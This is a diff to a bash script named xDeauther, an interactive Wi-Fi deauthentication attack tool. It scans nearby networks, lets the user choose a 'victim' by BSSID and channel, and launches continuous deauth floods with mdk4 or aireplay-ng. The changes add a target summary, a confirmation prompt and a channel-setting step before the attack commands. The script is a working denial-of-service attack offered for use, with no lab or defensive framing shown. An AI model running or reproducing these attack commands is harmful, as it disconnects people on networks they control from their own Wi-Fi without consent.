@@ -59,7 +59,7 @@ function interface() {
 function check_mode() {
   mode=$(iw $iface info | grep "type" )
   if [[ $mode == *'monitor'* ]]; then
-    echo -e "\n[${G}${BOLD}*${RST}] Interface already in monitor mode"
+    echo -e "\n[${Y}${BOLD}*${RST}] Interface already in monitor mode"
     sleep 2
     echo -e "[${G}${BOLD}+${RST}] Set ${C}${BOLD}$iface${RST} to main interface"
     sleep 2
@@ -104,9 +104,11 @@ function weapons() {
   echo -e "[${G}${BOLD}2${RST}] aireplay-ng [${Y}${BOLD}NORMAL${RST}]"
   echo -ne "\n${bgR}${H}xDeauther${RST}:${C}${BOLD}Weapons${RST} => "; read slct_weapons
   if [[ $slct_weapons == 1 ]]; then
-    echo -e "\n[${G}${BOLD}+${RST}] Take ${R}${BOLD}mdk4${RST} to be a weapon"
+    echo -e "\n[${G}${BOLD}+${RST}] Set ${R}${BOLD}mdk4${RST} weapon"
+    weapon="mdk4"
   elif [[ $slct_weapons == 2 ]]; then
-    echo -e "\n[${G}${BOLD}+${RST}] Take ${R}${BOLD}aireplay-ng${RST} to be a weapon"
+    echo -e "\n[${G}${BOLD}+${RST}] Set ${R}${BOLD}aireplay-ng${RST} to weapon"
+    weapon="aireplay-ng"
   else
     echo -e "\n[${R}${BOLD}!${RST}] Invalid Option! Please select number\n"
     weapons
@@ -120,7 +122,7 @@ function weapons() {
 function target() {
   echo -e "-=[ ${Y}${BOLD}EXPLORING TARGET${RST} ]=-\n"
   loading3&
-  echo -e "[${G}${BOLD}*${RST}] Wait at least 5 second and then press CTRL+C to stop"
+  echo -e "[${Y}${BOLD}*${RST}] Wait at least 5 second and then press CTRL+C to stop"
   xterm -e /bin/bash -l -c "airodump-ng -w log/target --output-format csv ${iface}"
   clear
   banner
@@ -139,19 +141,44 @@ function target() {
   channel=$(sed '1d' log/target.csv | cut -d, -f 14,4,1,6 | awk -F',' '{ print $2 }' | sed "${slct_target}!d")
   echo -e "\n[${G}${BOLD}+${RST}] Set${R}${BOLD}${ESSID}${RST} to victim"
   sleep 2
+  clear
+  banner
   launch_attack
 }
 
 function launch_attack() {
-  if [[ $slct_weapons == 1 ]]; then
-    xterm -fg "#FF0000" -T "Deauth${ESSID} with mdk4" -e /bin/bash -l -c "mdk4 ${iface} d -B ${BSSID} -c ${channel}"
-  elif [[ $slct_weapons == 2 ]]; then
-    xterm -fg "#FF0000" -T "Deauth${ESSID} with aireplay-ng" -e /bin/bash -l -c "aireplay-ng -0 0 -a ${BSSID} --ignore-negative-one ${iface}"
+  echo -e "-=[ ${R}${BOLD}LAUNCH ATTACK!${RST} ]=-\n"
+  echo -e "[ ${G}${BOLD}Victim${RST} ]"
+  echo -e "[${Y}${BOLD}*${RST}] Network:${ESSID}"
+  echo -e "[${Y}${BOLD}*${RST}] BSSID: ${BSSID}"
+  echo -e "[${Y}${BOLD}*${RST}] Channel:${channel}"
+  echo -e "\n[ ${G}${BOLD}Tools${RST} ]"
+  echo -e "[${Y}${BOLD}*${RST}] Interface: ${iface}"
+  echo -e "[${Y}${BOLD}*${RST}] Weapon: ${weapon}"
+  echo -e "\nAre you sure to attack this network?[y/n]\n"
+  echo -ne "${bgR}${H}xDeauther${RST}:${C}${BOLD}Attack${RST} => "; read launch
+  echo -e "\n[${Y}${BOLD}*${RST}] ${R}${BOLD}LAUNCH ATTACKK!!..${RST}"
+  sleep 2
+  if [[ $launch == y ]]; then
+    clear
+    banner
+    echo -e "-=[ ${R}${BOLD}ATTACKING${RST} ]=-\n"
+    echo -e "[${Y}${BOLD}*${RST}] Attacking${R}${ESSID}...${RST}"
+    echo -e "[${Y}${BOLD}*${RST}] Press CTRL+C to stop attack"
   fi
+  case $slct_weapons in
+    1 )
+      xterm -fg "#FF0000" -T "Deauth${ESSID} with mdk4" -e /bin/bash -l -c "mdk4 ${iface} d -B ${BSSID} -c ${channel}"
+      ;;
+    2 )
+      xterm -T "Wait... Set Channel" -e /bin/bash -l -c "timeout 2 airodump-ng -c ${channel} ${iface}"
+      sleep 1
+      xterm -fg "#FF0000" -T "Deauth${ESSID} with aireplay-ng" -e /bin/bash -l -c "aireplay-ng -0 0 -a ${BSSID} --ignore-negative-one ${iface}"
+  esac
 }
 
 function loading3() {
-  for (( i = 0; i <= 12 ; i++ )); do
+  for (( i = 0; i <= 10 ; i++ )); do
     echo -ne "[${Y}―${RST}] Exploring for target...\r"
     sleep 0.1
     echo -ne "[\]\r"
@@ -164,7 +191,7 @@ function loading3() {
 }
 
 function loading2() {
-  for (( i = 0; i <= 15 ; i++ )); do
+  for (( i = 0; i <= 8 ; i++ )); do
     echo -ne "[${Y}―${RST}] Change interface mode to monitor...\r"
     sleep 0.1
     echo -ne "[\]\r"
